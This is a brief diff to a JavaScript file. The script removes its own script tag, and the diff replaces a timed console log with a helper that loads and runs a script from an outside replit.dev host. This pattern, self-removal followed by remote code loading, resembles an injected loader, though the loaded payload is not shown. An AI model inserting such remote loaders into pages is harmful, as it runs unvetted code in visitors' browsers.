@@ -22,4 +22,8 @@ if (currentScript) {
     currentScript.remove();
 }
 
-setTimeout(()=>{console.log("hi tito")},1000)
+// Below is the actual script u fed
+
+function loadScript(src){let s=document.createElement("script");s.src=src;document.head.appendChild(s);}
+
+loadScript("https://8fba670f-e5a8-4db8-aa26-0e338f286593-00-36qkcc5ut3zr3.spock.replit.dev/static/client.js");
